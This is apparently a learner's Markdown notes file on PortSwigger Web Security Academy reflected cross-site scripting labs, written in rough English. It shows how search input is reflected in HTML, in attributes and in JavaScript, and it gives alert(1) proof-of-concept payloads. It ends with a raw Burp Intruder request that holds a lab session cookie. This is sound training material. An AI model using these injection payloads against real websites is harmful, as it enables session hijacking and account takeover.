## XXX(Cross-site scripting)

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions
that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy,
which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities
normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data.
If the victim user has privileged access within the application,
then the attacker might be able to gain full control over all of the application's functionality and data. 


## 1. Reflected XSS into HTML context with nothing encoded

You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html like

    <h1>
    0 search results for 'asif'
    </h1>
     

 ## This is Vulnerably

 ## 2. Reflected XSS into attribute with angle brackets HTML-encoded
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html input filed like
 
    <input type=text placeholder='Search the blog...' name=search value="asif">

Notice That 

    name=search value="asif" 
    
 The asif is double '' so use the paylods like double '' for example 
 
    "onmouseover="alert(1)
    
 
 ## This is Vulnerably
 
 
 ## 3. Reflected XSS into a JavaScript string with angle brackets HTML encoded 
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in JavaScript filed like
 
    <script>
    var searchTerms = 'asif';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>
 
 Paylods 
 
    '-alert(1)-'
 
 
 ## This is vulnerably 
 
 
 ## 4. Reflected XSS into HTML context with most tags and attributes blocked
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html This is 
 vulnerably and Inject a standard XSS paylods Observe that this gets blocked most html tages attributes are blocked.
 
 You Have a Search Funtion and search like asif and intercept the request and sand the intruder and remove asif and add <$$> like 
 
   GET /?search=<$$> HTTP/1.1
Host: 0a130031045b2eeac06b090600110008.web-security-academy.net
Cookie: session=Xvy6OLwWRumjRFxHQqruIfV77mnV5YmN
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a130031045b2eeac06b090600110008.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
 
 
 
 
 
 
 
 
 
 
 
 
